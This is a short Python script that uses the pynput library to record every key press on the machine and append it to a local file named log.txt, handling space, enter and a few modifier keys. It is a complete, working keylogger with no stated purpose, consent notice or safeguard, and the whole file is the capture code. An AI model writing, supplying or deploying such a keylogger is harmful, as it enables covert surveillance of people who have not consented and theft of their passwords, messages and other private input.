from pynput.keyboard import Listener

def write_to_file(key):
    chara = str(key)
    chara = chara.replace("'", "")
    if chara == 'Key.space':
        chara = ' '
    if chara == 'Key.shift_r':
        chara = ''
    if chara == "Key.ctrl_l":
        chara = ""
    if chara == "Key.enter":
        chara = "\n"
    with open("log.txt", 'a') as f:
        f.write(chara)

with Listener(on_press=write_to_file) as l:
    l.join()


